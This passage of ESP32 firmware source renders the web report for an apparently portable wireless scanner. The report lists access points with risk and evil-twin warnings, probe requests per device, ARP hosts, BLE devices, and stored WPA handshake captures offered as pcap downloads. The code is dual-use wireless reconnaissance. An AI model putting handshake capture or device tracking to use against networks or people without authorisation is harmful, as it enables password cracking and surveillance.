    html += F("<p class='muted'>LOW=WPA3 &nbsp; MEDIUM=WPA2 &nbsp; HIGH=WPA1 &nbsp; CRITICAL=OPEN/WEP</p>");

    bool anyAnomalies = false;
    for (int i = 0; i < g_seenCount; i++) {
      if (g_seen[i].anomalyFlags) { anyAnomalies = true; break; }
    }

    if (anyAnomalies) {
      html += F("<div class='card'>");
      html += F("<h2>&#9888; Anomalies Detected</h2>");
      html += F("<div class='tbl-wrap'>");
      html += F("<table class='fixed'><tr><th>ESSID</th><th>BSSID</th><th>Warning</th></tr>");

      for (int i = 0; i < g_seenCount; i++) {
        if (!g_seen[i].anomalyFlags) continue;

        const ScanResult& r = g_seen[i];
        char bf[18];
        bssidFull(r.bssid, bf, sizeof(bf));

        const char* warning = "";
        if (r.anomalyFlags & ANOM_EVIL_TWIN) {
          warning = "!! Possible Evil Twin";
        } else if (r.anomalyFlags & ANOM_AUTH_CHANGE) {
          warning = "! Auth mode changed";
        } else if (r.anomalyFlags & ANOM_DUPLICATE_SSID) {
          warning = "i Duplicate SSID detected";
        } else if (r.anomalyFlags & ANOM_CHANNEL_SHIFT) {
          warning = "! Channel shift detected";
        } else if (r.anomalyFlags & ANOM_BSSID_ROTATION) {
          warning = "i Duplicate infrastructure detected";
        }

        html += F("<tr><td>");
        if (r.essid[0]) appendHtmlEscaped(html, r.essid);
        else html += F("<i>hidden</i>");
        html += F("</td><td class='mac'>");
        html += bf;
        html += F("</td><td class='danger'>");
        html += warning;
        html += F("</td></tr>");
      }
      html += F("</table></div>");
      html += F("</div>");
    }
  }
  // ── Probe Requests ────────────────────────────────────────────────────────
  if (g_probeCount > 0) {
    html += F("<h2>Probe Requests</h2>");

    static bool counted[MAX_PROBES];
    memset(counted, 0, sizeof(counted));
    int uniqueDevices = 0;
    for (int i = 0; i < g_probeCount; i++) {
      if (counted[i]) continue;
      uniqueDevices++;
      for (int j = i + 1; j < g_probeCount; j++) {
        if (memcmp(g_probes[i].mac, g_probes[j].mac, 6) == 0)
          counted[j] = true;
      }
    }

    char probeSummary[128];
    snprintf(probeSummary, sizeof(probeSummary),
      "<p class='sub'>%d unique devices &nbsp;|&nbsp; %d named probes &nbsp;|&nbsp; %lu total seen</p>",
      uniqueDevices, g_probeCount, (unsigned long)g_probeTotalSeen);
    html += probeSummary;

    if (g_deauthCount > 0) {
      char deauthBuf[128];
      snprintf(deauthBuf, sizeof(deauthBuf),
        "<p class='danger'>!! %lu deauthentication frames detected during this session</p>",
        (unsigned long)g_deauthCount);
      html += deauthBuf;
    }

    html += F("<div class='tbl-wrap'>");
    html += F("<table>");
    html += F("<tr><th>#</th><th>MAC</th><th>Type</th><th>Networks</th><th>SSIDs</th></tr>");

    memset(counted, 0, sizeof(counted));
    static int sortedIdx[MAX_PROBES];
    int sortedCount = 0;

    for (int i = 0; i < g_probeCount; i++) {
      if (counted[i]) continue;
      counted[i] = true;
      int cnt = 1;
      for (int j = i + 1; j < g_probeCount; j++) {
        if (memcmp(g_probes[i].mac, g_probes[j].mac, 6) == 0) {
          cnt++;
          counted[j] = true;
        }
      }
      int pos = sortedCount;
      while (pos > 0) {
        int prevCnt = 0;
        for (int k = 0; k < g_probeCount; k++) {
          if (memcmp(g_probes[sortedIdx[pos-1]].mac, g_probes[k].mac, 6) == 0) prevCnt++;
        }
        if (prevCnt >= cnt) break;
        sortedIdx[pos] = sortedIdx[pos-1];
        pos--;
      }
      sortedIdx[pos] = i;
      sortedCount++;
    }

    memset(counted, 0, sizeof(counted));
    int clientNum = 1;

    for (int si = 0; si < sortedCount; si++) {
      int i = sortedIdx[si];
      if (counted[i]) continue;
      counted[i] = true;

      int ssidCount = 1;
      for (int j = i + 1; j < g_probeCount; j++) {
        if (memcmp(g_probes[i].mac, g_probes[j].mac, 6) == 0) {
          ssidCount++;
          counted[j] = true;
        }
      }

      bool isCorporate = ssidCount >= 3;
      char bf[18];
      bssidFull(g_probes[i].mac, bf, sizeof(bf));

      html += F("<tr><td>C ");
      html += clientNum++;
      html += F("</td><td class='mac'>");
      html += bf;
      html += F("</td><td>");
      html += g_probes[i].randomized ? F("<span class='muted'>Rand</span>") : F("<span>Real</span>");
      html += F("</td><td>");
      html += ssidCount;
      if (isCorporate) html += F(" <span class='danger'>corp?</span>");
      html += F("</td><td>");
      html += F("&rarr; ");
      appendHtmlEscaped(html, g_probes[i].ssid);
      for (int j = i + 1; j < g_probeCount; j++) {
        if (memcmp(g_probes[i].mac, g_probes[j].mac, 6) == 0) {
          html += F("<br>&rarr; ");
          appendHtmlEscaped(html, g_probes[j].ssid);
        }
      }
      html += F("</td></tr>");
    }

    html += F("</table></div>");
  }

  // ── ARP Scan Results ─────────────────────────────────────────────────────
  if (g_arpCount > 0) {
    html += F("<h2>ARP Scan Results</h2>");

    char arpSummary[128];
    snprintf(arpSummary, sizeof(arpSummary),
      "<p class='sub'>%d devices discovered on %s</p>",
      g_arpCount, g_arpSSID);
    html += arpSummary;

    html += F("<div class='tbl-wrap'>");
    html += F("<table>");
    html += F("<tr><th>#</th><th>IP Address</th><th>MAC</th><th>Vendor</th><th>Seen</th></tr>");

    for (int i = 0; i < g_arpCount; i++) {
      const ArpEntry& e = g_arpEntries[i];
      char bf[18];
      bssidFull(e.mac, bf, sizeof(bf));

      // Identify common vendors from MAC OUI
      const char* vendor = "Unknown";
      if      (e.mac[0]==0xCC && e.mac[1]==0x28 && e.mac[2]==0xAA) vendor = "ASUS";
      else if (e.mac[0]==0x44 && e.mac[1]==0x1B && e.mac[2]==0xF6) vendor = "Heltec";
      else if (e.mac[0]==0xAC || e.mac[0]==0xBC || e.mac[0]==0x8C) vendor = "Samsung";
      else if (e.mac[0]==0x3C || e.mac[0]==0xF4 || e.mac[0]==0xA4) vendor = "Apple";
      else if (e.mac[0]==0x00 && e.mac[1]==0x0C && e.mac[2]==0x29) vendor = "VMware";

      html += F("<tr><td>");
      html += (i + 1);
      html += F("</td><td class='mac'>");
      html += e.ip[0]; html += F(".");
      html += e.ip[1]; html += F(".");
      html += e.ip[2]; html += F(".");
      html += e.ip[3];
      html += F("</td><td class='mac'>");
      html += bf;
      html += F("</td><td>");
      html += vendor;
      html += F("</td><td class='muted'>");
      html += e.count;
      html += F(" packets</td></tr>");
    }

    html += F("</table></div>");
  }

  // ── BLE Scan Results ─────────────────────────────────────────────────────
  if (g_bleCount > 0) {
    html += F("<h2>BLE Devices</h2>");

    // Count by type
    int iotCount     = 0;
    int appleCount   = 0;
    int samsungCount = 0;
    int fitnessCount = 0;
    int conCount     = 0;
    for (int i = 0; i < g_bleCount; i++) {
      if (g_bleDevices[i].isIoT)       iotCount++;
      if (g_bleDevices[i].isApple)     appleCount++;
      if (g_bleDevices[i].isSamsung)   samsungCount++;
      if (g_bleDevices[i].isFitness)   fitnessCount++;
      if (g_bleDevices[i].connectable) conCount++;
    }

    char bleSummary[192];
    snprintf(bleSummary, sizeof(bleSummary),
      "<p class='sub'>%d devices &nbsp;|&nbsp; %d Apple &nbsp;|&nbsp; "
      "%d Samsung &nbsp;|&nbsp; %d Fitness &nbsp;|&nbsp; "
      "%d IoT &nbsp;|&nbsp; %d Connectable</p>",
      g_bleCount, appleCount, samsungCount,
      fitnessCount, iotCount, conCount);
    html += bleSummary;

    html += F("<div class='tbl-wrap'>");
    html += F("<table>");
    html += F("<tr><th>#</th><th>MAC</th><th>Name</th><th>Vendor</th>"
              "<th>Type</th><th>RSSI</th><th>Conn</th><th>Seen</th></tr>");

    for (int i = 0; i < g_bleCount; i++) {
      const BleDevice& d = g_bleDevices[i];
      char bf[18];
      bssidFull(d.mac, bf, sizeof(bf));

      const char* type = "Generic";
      const char* typeColor = "#6e7681";
      if (d.isIoT) {
        type = "IoT";
        typeColor = "#e67e22";
      } else if (d.isApple) {
        type = "Apple";
        typeColor = "#58a6ff";
      } else if (d.isSamsung) {
        type = "Samsung";
        typeColor = "#1f6feb";
      } else if (d.isFitness) {
        type = "Fitness";
        typeColor = "#2ecc71";
      }

      html += F("<tr><td>");
      html += (i + 1);
      html += F("</td><td class='mac'>");
      html += bf;
      html += F("</td><td>");
      if (d.name[0]) appendHtmlEscaped(html, d.name);
      else html += F("<span class='muted'>(unnamed)</span>");
      html += F("</td><td>");
      html += bleVendorName(d.manufacturer);
      html += F("</td><td><span class='badge' style='background:");
      html += typeColor;
      html += F("'>");
      html += type;
      html += F("</span></td><td>");
      html += d.rssi;
      html += F(" dBm</td><td>");
      html += d.connectable ?
        F("<span class='danger'>YES</span>") :
        F("<span class='muted'>no</span>");
      html += F("</td><td class='muted'>");
      html += d.count;
      html += F("x</td></tr>");
    }

    html += F("</table></div>");

    // Highlight connectable IoT devices
    bool anyConnectable = false;
    for (int i = 0; i < g_bleCount; i++) {
      if (g_bleDevices[i].connectable && g_bleDevices[i].isIoT) {
        anyConnectable = true;
        break;
      }
    }
    if (anyConnectable) {
      html += F("<p class='danger'>!! Connectable BLE devices detected. "
                "These devices advertise BLE connectivity and may accept connections without authentication.</p>");
    }
  }

  // ── Handshake Captures ────────────────────────────────────────────────────
  html += F("<div class='card'>");
  html += F("<h2>Handshake Captures</h2>");

  char hsBuf[128];
  snprintf(hsBuf, sizeof(hsBuf),
    "<p class='muted'>%d captures stored</p>",
    g_handshakeIndex.count);
  html += hsBuf;

  if (g_handshakeIndex.count > 0) {
    html += F("<div class='tbl-wrap'>");
    html += F("<table>");
    html += F("<tr><th>SSID</th><th>CH</th><th>EAPOL</th><th>Status</th><th>File</th></tr>");

    for (int n = 0; n < g_handshakeIndex.count; n++) {
      int i = (g_handshakeIndex.next - 1 - n + MAX_HANDSHAKES) % MAX_HANDSHAKES;
      HandshakeMeta& s = g_handshakeIndex.sessions[i];
      if (!s.filename[0]) continue;

      html += F("<tr><td>");
      if (s.ssid[0]) appendHtmlEscaped(html, s.ssid);
      else html += F("<i>hidden</i>");
      html += F("</td><td>");
      html += String(s.channel);
      html += F("</td><td>");
      html += String(s.eapolCount);
      html += F("</td><td>");
      if (s.eapolCount >= 4) {
        html += F("<span class='badge' style='background:#238636'>VALID</span>");
      } else if (s.eapolCount > 0) {
        html += F("<span class='badge' style='background:#9e6a03'>PARTIAL</span>");
      } else {
        html += F("<span class='badge' style='background:#6e7681'>EMPTY</span>");
      }
      html += F("</td><td><a href='/downloadHandshake?id=");
      html += String(i);
      html += F("'>Download</a></td></tr>");
    }

    html += F("</table></div>");
  } else {
    html += F("<p class='muted'>No handshake captures saved yet.</p>");
  }

  html += F("</div>");

   // ── WiFi Scan Sessions ────────────────────────────────────────────────────
  html += F("<div class='card'>");
  html += F("<h2>WiFi Scan Sessions</h2>");

  char sessionBuf[128];
  size_t total = fsTotalBytesSafe();
  size_t used  = fsUsedBytesSafe();
  int pct = total > 0 ? (int)((used * 100UL) / total) : 0;

  snprintf(sessionBuf, sizeof(sessionBuf),
    "<p class='muted'>%d sessions stored &nbsp;|&nbsp; %d%% flash used</p>",
    g_sessionIndex.count, pct);
  html += sessionBuf;

  if (g_sessionIndex.count > 0) {
    html += F("<p><a href='/sessions'>View Saved WiFi Sessions &rarr;</a></p>");
  } else {
    html += F("<p class='muted'>No WiFi sessions saved yet. Run a scan first.</p>");
  }
  html += F("</div>");

  // ── Probe Sessions ────────────────────────────────────────────────────────
  html += F("<div class='card'>");
  html += F("<h2>Probe Sessions</h2>");

  char probeSessBuf[128];
  snprintf(probeSessBuf, sizeof(probeSessBuf),
    "<p class='muted'>%d sessions stored &nbsp;|&nbsp; %d%% flash used</p>",
    g_probeTotal, pct);
  html += probeSessBuf;

  if (g_probeTotal > 0) {
    html += F("<p><a href='/probes'>View Saved Probe Sessions &rarr;</a></p>");
  } else {
    html += F("<p class='muted'>No probe sessions saved yet. Run the probe sniffer first.</p>");
  }

  html += F("</div>");

  // ── ARP Sessions ─────────────────────────────────────────────────────────
  html += F("<div class='card'>");
  html += F("<h2>ARP Sessions</h2>");
  char arpSesBuf[128];
  snprintf(arpSesBuf, sizeof(arpSesBuf),
    "<p class='muted'>%d sessions stored</p>", g_arpSessionTotal);
  html += arpSesBuf;
  if (g_arpSessionTotal > 0) {
    html += F("<p><a href='/arpsessions'>View Saved ARP Sessions &rarr;</a></p>");
  } else {
    html += F("<p class='muted'>No ARP sessions saved yet.</p>");
  }
  html += F("</div>");

  // ── BLE Sessions ─────────────────────────────────────────────────────────
  html += F("<div class='card'>");
  html += F("<h2>BLE Sessions</h2>");
  char bleSesBuf[128];
  snprintf(bleSesBuf, sizeof(bleSesBuf),
    "<p class='muted'>%d sessions stored</p>", g_bleScanTotal);
  html += bleSesBuf;
  if (g_bleScanTotal > 0) {
    html += F("<p><a href='/blesessions'>View Saved BLE Sessions &rarr;</a></p>");
  } else {
    html += F("<p class='muted'>No BLE sessions saved yet.</p>");
  }
  html += F("</div>");

  html += F("</body></html>");
  server.send(200, "text/html", html);
}


static void handleSessions() {
  String html;
  html.reserve(2048);
  html  = F("<!DOCTYPE html><html><head>");
  html += F("<meta name='viewport' content='width=device-width,initial-scale=1'>");
  html += F("<title>Wifi Scan Sessions</title><style>");
  html += F("body{font-family:Inter,system-ui,sans-serif;background:#0f1117;color:#d6d9df;padding:16px;max-width:1100px;margin:auto;line-height:1.5}");
  html += F("h1{font-size:26px;margin-bottom:4px;color:#f3f4f6;letter-spacing:-0.5px}");
  html += F("h2{font-size:18px;margin-top:24px;margin-bottom:10px;color:#f3f4f6}");
  html += F(".tbl-wrap{width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch}");
  html += F("table{width:100%;table-layout:fixed;border-collapse:collapse;background:#161b22;border:1px solid #21262d;border-radius:12px;overflow:hidden;margin-top:12px}");
  html += F("th{background:#1c2128;color:#9da7b3;font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:0.03em;padding:6px 5px;text-align:left;white-space:nowrap;border-bottom:1px solid #2d333b}");
  html += F("td{padding:6px 5px;font-size:11px;border-bottom:1px solid #21262d}");
  html += F("td:first-child{max-width:120px;overflow-wrap:break-word}");
  html += F("tr:last-child td{border-bottom:none}");
  html += F("tr:nth-child(even){background:#141922}");
  html += F("tr:hover{background:#1b222c}");
  html += F(".mac{font-family:monospace;font-size:10px;white-space:nowrap}");
  html += F("a{color:#58a6ff;text-decoration:none;font-weight:500}");
  html += F("a:hover{text-decoration:underline}");
  html += F(".muted{color:#8b949e;font-size:11px}");
  html += F(".danger{color:#ff7b72;font-weight:600}");
  html += F(".footer{margin-top:18px;color:#6e7681;font-size:11px}");
  html += F("</style></head><body>");
  html += F("<h1>Wifi Scan Sessions</h1>");
  html += F("<p class='footer'><a href='/'>&larr; Back to report</a></p>");

  if (g_sessionIndex.count == 0) {
    html += F("<p class='muted'>No sessions saved yet.</p>");
  } else {
    char buf[128];
    size_t total = fsTotalBytesSafe();
    size_t used  = fsUsedBytesSafe();
    int pct = total > 0 ? (int)((used * 100UL) / total) : 0;
    snprintf(buf, sizeof(buf), "<p class='muted'>%d sessions stored &nbsp;|&nbsp; %d%% flash used</p>",
             g_sessionIndex.count, pct);
    html += buf;

    html += F("<div class='tbl-wrap'>");
    html += F("<table><tr><th>Scan #</th><th>APs</th><th>Anomalies</th><th>Download</th></tr>");

    for (int i = g_sessionIndex.count - 1; i >= 0; i--) {
      int idx = (g_sessionIndex.next - g_sessionIndex.count + i + MAX_SESSIONS) % MAX_SESSIONS;
      const SessionMeta& s = g_sessionIndex.sessions[idx];

      html += F("<tr><td>Scan #");
      html += (unsigned long)s.scanNumber;
      html += F("</td><td>");
      html += s.apCount;
      html += F("</td><td>");
      if (s.anomalyCount > 0) {
        html += F("<span class='danger'>");
        html += s.anomalyCount;
        html += F(" anomalies</span>");
      } else {
        html += F("<span class='muted'>0</span>");
      }
      html += F("</td><td><a href='/session?f=");
      html += s.filename;
      html += F("'>Download</a></td></tr>");
    }
    html += F("</table></div>");
  }

  html += F("<p class='footer'><a href='/'>&#8592; Back to report</a></p>");
  html += F("</body></html>");
  server.send(200, "text/html", html);
}

static void handleSessionDownload() {
  if (!server.hasArg("f")) {
    server.send(400, "text/plain", "Missing file parameter");
    return;
  }
  String filename = server.arg("f");

  // Safety check - only allow s000.csv style filenames
  if (!isIndexedFilename(filename, 's', "csv")) {
    server.send(400, "text/plain", "Invalid filename");
    return;
  }

  String path = "/sessions/" + filename;
  File f = FS.open(path, "r");
  if (!f) {
    server.send(404, "text/plain", "Session not found");
    return;
  }

  server.sendHeader("Content-Disposition", "attachment; filename=" + filename);
  server.streamFile(f, "text/csv");
  f.close();
}

static void handleCsvExport() {
  String csv;
  csv.reserve(4096);

  // WiFi scan section
  csv = F("=== WiFi Scan ===\r\n");
  csv += F("ESSID,BSSID,PWR,CH,MB,ENC,CIPHER,AUTH,RISK,FIRST_SEEN_S,LAST_SEEN_S,SIGHTINGS,FLAGS\r\n");

  for (int i = 0; i < g_resultCount; i++) {
    const ScanResult& r = g_results[i];
    char bf[18], mb[8];
    bssidFull(r.bssid, bf, sizeof(bf));
    mbStr(r.maxRate, r.rateIsN, mb, sizeof(mb));

    appendCsvEscaped(csv, r.essid[0] ? r.essid : "(hidden)");
    csv += ","; csv += bf;
    csv += ","; csv += r.rssi;
    csv += ","; csv += r.channel;
    csv += ","; csv += mb;
    csv += ","; csv += encLabel(r.authMode);
    csv += ","; csv += cipherLabel(r.authMode);
    csv += ","; csv += authLabel(r.authMode);
    csv += ","; csv += riskWord(r.riskLevel);
    csv += ","; csv += (r.firstSeen / 1000);
    csv += ","; csv += (r.lastSeen / 1000);
    csv += ","; csv += r.sightings;
    csv += ","; csv += r.anomalyFlags;
    csv += "\r\n";
  }

  // Probe session section
  if (g_probeCount > 0) {
    csv += F("\r\n=== Probe Requests ===\r\n");
    csv += F("MAC,SSID,RSSI,FIRST_SEEN,LAST_SEEN,COUNT,RANDOMIZED\r\n");

    for (int i = 0; i < g_probeCount; i++) {
      const ProbeResult& p = g_probes[i];
      char bf[18];
      bssidFull(p.mac, bf, sizeof(bf));
      csv += bf;
      csv += ","; appendCsvEscaped(csv, p.ssid[0] ? p.ssid : "<any>");
      csv += ","; csv += p.rssi;
      csv += ","; csv += (p.firstSeen / 1000);
      csv += ","; csv += (p.lastSeen / 1000);
      csv += ","; csv += p.count;
      csv += ","; csv += (p.randomized ? "yes" : "no");
      csv += "\r\n";
    }
  }

  server.sendHeader("Content-Disposition", "attachment; filename=wifi_security_scan.csv");
  server.send(200, "text/csv", csv);
}

static void handleProbes() {
  String html;
  html.reserve(2048);
  html  = F("<!DOCTYPE html><html><head>");
  html += F("<meta name='viewport' content='width=device-width,initial-scale=1'>");
  html += F("<title>Probe Sessions</title><style>");
  html += F("body{font-family:Inter,system-ui,sans-serif;background:#0f1117;color:#d6d9df;padding:16px;max-width:1100px;margin:auto;line-height:1.5}");
  html += F("h1{font-size:26px;margin-bottom:4px;color:#f3f4f6;letter-spacing:-0.5px}");
  html += F(".tbl-wrap{width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch}");
  html += F("table{width:100%;border-collapse:collapse;background:#161b22;border:1px solid #21262d;border-radius:12px;overflow:hidden;margin-top:12px}");
  html += F("th{background:#1c2128;color:#9da7b3;font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:0.03em;padding:6px 5px;text-align:left;white-space:nowrap;border-bottom:1px solid #2d333b}");
  html += F("td{padding:6px 5px;font-size:11px;border-bottom:1px solid #21262d}");
  html += F("tr:last-child td{border-bottom:none}");
  html += F("tr:nth-child(even){background:#141922}");
  html += F("tr:hover{background:#1b222c}");
  html += F(".mac{font-family:monospace;font-size:10px;white-space:nowrap}");
  html += F("a{color:#58a6ff;text-decoration:none;font-weight:500}");
  html += F("a:hover{text-decoration:underline}");
  html += F(".muted{color:#8b949e;font-size:11px}");
  html += F(".footer{margin-top:18px;color:#6e7681;font-size:11px}");
  html += F("</style></head><body>");
  html += F("<h1>Probe Sessions</h1>");
  html += F("<p class='footer'><a href='/'>&larr; Back to report</a></p>");

  // List all saved probe files
  File dir = FS.open("/probes");
  if (!dir || !dir.isDirectory()) {
    html += F("<p class='muted'>No probe sessions saved yet.</p>");
  } else {
    // Count files first
    int fileCount = 0;
    File f = dir.openNextFile();
    while (f) { if (!f.isDirectory()) fileCount++; f = dir.openNextFile(); }
    dir.close();

    if (fileCount == 0) {
      html += F("<p class='muted'>No probe sessions saved yet.</p>");
    } else {
      char buf[64];
      snprintf(buf, sizeof(buf), "<p class='muted'>%d probe sessions stored</p>", fileCount);
      html += buf;

      html += F("<div class='tbl-wrap'>");
      html += F("<table><tr><th>File</th><th>Size</th><th>Download</th></tr>");

      dir = FS.open("/probes");
      f = dir.openNextFile();
      int num = 1;
      while (f) {
        if (!f.isDirectory()) {
          String fname = String(f.name());
          int slash = fname.lastIndexOf('/');
          if (slash >= 0) fname = fname.substring(slash + 1);

          html += F("<tr><td>Probe #");
          html += num++;
          html += F("</td><td class='muted'>");
          html += f.size();
          html += F(" bytes</td><td><a href='/probe?f=");
          html += fname;
          html += F("'>Download CSV</a></td></tr>");
        }
        f = dir.openNextFile();
      }
      dir.close();
      html += F("</table></div>");
    }
  }

  html += F("<p class='footer'><a href='/'>&#8592; Back to report</a></p>");
  html += F("</body></html>");
  server.send(200, "text/html", html);
}

static void handleArpSessions() {
  String html;
  html.reserve(2048);
  html  = F("<!DOCTYPE html><html><head>");
  html += F("<meta name='viewport' content='width=device-width,initial-scale=1'>");
  html += F("<title>ARP Sessions</title><style>");
  html += F("body{font-family:Inter,system-ui,sans-serif;background:#0f1117;color:#d6d9df;padding:16px;max-width:1100px;margin:auto;line-height:1.5}");
  html += F("h1{font-size:26px;margin-bottom:4px;color:#f3f4f6;letter-spacing:-0.5px}");
  html += F(".tbl-wrap{width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch}");
  html += F("table{width:100%;border-collapse:collapse;background:#161b22;border:1px solid #21262d;border-radius:12px;overflow:hidden;margin-top:12px}");
  html += F("th{background:#1c2128;color:#9da7b3;font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:0.03em;padding:6px 5px;text-align:left;white-space:nowrap;border-bottom:1px solid #2d333b}");
  html += F("td{padding:6px 5px;font-size:11px;border-bottom:1px solid #21262d}");
  html += F("tr:last-child td{border-bottom:none}");
  html += F("tr:nth-child(even){background:#141922}");
  html += F("tr:hover{background:#1b222c}");
  html += F(".mac{font-family:monospace;font-size:10px;white-space:nowrap}");
  html += F("a{color:#58a6ff;text-decoration:none;font-weight:500}");
  html += F("a:hover{text-decoration:underline}");
  html += F(".muted{color:#8b949e;font-size:11px}");
  html += F(".footer{margin-top:18px;color:#6e7681;font-size:11px}");
  html += F("</style></head><body>");
  html += F("<h1>ARP Sessions</h1>");
  html += F("<p class='footer'><a href='/'>&larr; Back to report</a></p>");

  File dir = FS.open("/arp");
  if (!dir || !dir.isDirectory()) {
    html += F("<p class='muted'>No ARP sessions saved yet.</p>");
  } else {
    int fileCount = 0;
    File f = dir.openNextFile();
    while (f) { if (!f.isDirectory()) fileCount++; f = dir.openNextFile(); }
    dir.close();

    if (fileCount == 0) {
      html += F("<p class='muted'>No ARP sessions saved yet.</p>");
    } else {
      char buf[64];
      snprintf(buf, sizeof(buf), "<p class='muted'>%d ARP sessions stored</p>", fileCount);
      html += buf;

      html += F("<div class='tbl-wrap'>");
      html += F("<table><tr><th>Session</th><th>Size</th><th>Download</th></tr>");

      dir = FS.open("/arp");
      f = dir.openNextFile();
      int num = 1;
      while (f) {
        if (!f.isDirectory()) {
          String fname = String(f.name());
          int slash = fname.lastIndexOf('/');
          if (slash >= 0) fname = fname.substring(slash + 1);

          html += F("<tr><td>ARP #");
          html += num++;
          html += F("</td><td class='muted'>");
          html += f.size();
          html += F(" bytes</td><td><a href='/arp?f=");
          html += fname;
          html += F("'>Download CSV</a></td></tr>");
        }
        f = dir.openNextFile();
      }
      dir.close();
      html += F("</table></div>");
    }
  }

  html += F("<p class='footer'><a href='/'>&#8592; Back to report</a></p>");
  html += F("</body></html>");
  server.send(200, "text/html", html);
}

static void handleProbeDownload() {
  if (!server.hasArg("f")) {
    server.send(400, "text/plain", "Missing file parameter");
    return;
  }
  String filename = server.arg("f");

  // Safety check
  if (!isIndexedFilename(filename, 'p', "csv")) {
    server.send(400, "text/plain", "Invalid filename");
    return;
  }

  String path = "/probes/" + filename;
  File f = FS.open(path, "r");
  if (!f) {
    server.send(404, "text/plain", "Probe session not found");
    return;
  }

  server.sendHeader("Content-Disposition", "attachment; filename=" + filename);
  server.streamFile(f, "text/csv");
  f.close();
}

static void handleHandshakeDownload() {

    if (!server.hasArg("id")) {
        server.send(400, "text/plain", "Missing ID");
        return;
    }

    int id = server.arg("id").toInt();

    if (id < 0 || id >= g_handshakeIndex.count) {
        server.send(404, "text/plain", "Invalid ID");
        return;
    }

    HandshakeMeta& s =
        g_handshakeIndex.sessions[id];

    char path[64];

    snprintf(path,
             sizeof(path),
             "/handshakes/%s",
             s.filename);

    File f = FS.open(path, "r");

    if (!f) {
        server.send(404, "text/plain", "File not found");
        return;
    }

    server.streamFile(
        f,
        "application/vnd.tcpdump.pcap"
    );

    f.close();
}

static void handleArpDownload() {
  if (!server.hasArg("f")) {
    server.send(400, "text/plain", "Missing file parameter");
    return;
  }
  String filename = server.arg("f");

  if (!isIndexedFilename(filename, 'a', "csv")) {
    server.send(400, "text/plain", "Invalid filename");
    return;
  }

  String path = "/arp/" + filename;
  File f = FS.open(path, "r");
  if (!f) {
    server.send(404, "text/plain", "ARP session not found");
    return;
  }

  server.sendHeader("Content-Disposition", "attachment; filename=" + filename);
  server.streamFile(f, "text/csv");
  f.close();
}

static void handleBleSessions() {
  String html;
  html.reserve(2048);
  html  = F("<!DOCTYPE html><html><head>");
  html += F("<meta name='viewport' content='width=device-width,initial-scale=1'>");
  html += F("<title>BLE Sessions</title><style>");
  html += F("body{font-family:Inter,system-ui,sans-serif;background:#0f1117;color:#d6d9df;padding:16px;max-width:1100px;margin:auto;line-height:1.5}");
  html += F("h1{font-size:26px;margin-bottom:4px;color:#f3f4f6;letter-spacing:-0.5px}");
  html += F(".tbl-wrap{width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch}");
  html += F("table{width:100%;border-collapse:collapse;background:#161b22;border:1px solid #21262d;border-radius:12px;overflow:hidden;margin-top:12px}");
  html += F("th{background:#1c2128;color:#9da7b3;font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:0.03em;padding:6px 5px;text-align:left;white-space:nowrap;border-bottom:1px solid #2d333b}");
  html += F("td{padding:6px 5px;font-size:11px;border-bottom:1px solid #21262d}");
  html += F("tr:last-child td{border-bottom:none}");
  html += F("tr:nth-child(even){background:#141922}");
  html += F("tr:hover{background:#1b222c}");
  html += F(".mac{font-family:monospace;font-size:10px;white-space:nowrap}");
  html += F("a{color:#58a6ff;text-decoration:none;font-weight:500}");
  html += F("a:hover{text-decoration:underline}");
  html += F(".muted{color:#8b949e;font-size:11px}");
  html += F(".footer{margin-top:18px;color:#6e7681;font-size:11px}");
  html += F("</style></head><body>");
  html += F("<h1>BLE Sessions</h1>");
  html += F("<p class='footer'><a href='/'>&larr; Back to report</a></p>");

  File dir = FS.open("/ble");
  if (!dir || !dir.isDirectory()) {
    html += F("<p class='muted'>No BLE sessions saved yet.</p>");
  } else {
    int fileCount = 0;
    File f = dir.openNextFile();
    while (f) { if (!f.isDirectory()) fileCount++; f = dir.openNextFile(); }
    dir.close();

    if (fileCount == 0) {
      html += F("<p class='muted'>No BLE sessions saved yet.</p>");
    } else {
      char buf[64];
      snprintf(buf, sizeof(buf), "<p class='muted'>%d BLE sessions stored</p>", fileCount);
      html += buf;

      html += F("<div class='tbl-wrap'>");
      html += F("<table><tr><th>Session</th><th>Size</th><th>Download</th></tr>");

      dir = FS.open("/ble");
      f = dir.openNextFile();
      int num = 1;
      while (f) {
        if (!f.isDirectory()) {
          String fname = String(f.name());
          int slash = fname.lastIndexOf('/');
          if (slash >= 0) fname = fname.substring(slash + 1);

          html += F("<tr><td>BLE #");
          html += num++;
          html += F("</td><td class='muted'>");
          html += f.size();
          html += F(" bytes</td><td><a href='/blesession?f=");
          html += fname;
          html += F("'>Download CSV</a></td></tr>");
        }
        f = dir.openNextFile();
      }
      dir.close();
      html += F("</table></div>");
    }
  }

  html += F("<p class='footer'><a href='/'>&#8592; Back to report</a></p>");
  html += F("</body></html>");
  server.send(200, "text/html", html);
}

static void handleBleDownload() {
  if (!server.hasArg("f")) {
    server.send(400, "text/plain", "Missing file parameter");
    return;
  }
  String filename = server.arg("f");

  if (!isIndexedFilename(filename, 'b', "csv")) {
    server.send(400, "text/plain", "Invalid filename");
    return;
  }

  String path = "/ble/" + filename;
  File f = FS.open(path, "r");
  if (!f) {
    server.send(404, "text/plain", "BLE session not found");
    return;
  }

  server.sendHeader("Content-Disposition", "attachment; filename=" + filename);
  server.streamFile(f, "text/csv");
  f.close();
}

static void startWebReport() {
  setCpuFrequencyMhz(240);
  server.stop();
  delay(100);  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID, AP_PASS);
  delay(200);
  server.on("/", handleWebReport);
  server.on("/export", handleCsvExport);
  server.on("/sessions", handleSessions);
  server.on("/session", handleSessionDownload);
  server.on("/probes", handleProbes);
  server.on("/blesessions", handleBleSessions);
  server.on("/blesession",  handleBleDownload);
  server.on("/probe", handleProbeDownload); 
  server.on("/downloadHandshake",
          HTTP_GET,
          handleHandshakeDownload);
  server.on("/arpsessions", handleArpSessions);
  server.on("/arp", handleArpDownload);
  server.begin();
  mode = MODE_WEBREPORT;
  drawWebReportScreen();
}

static void stopWebReport() {
  server.stop();
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
  delay(150);
  esp_wifi_stop();
  btStop();
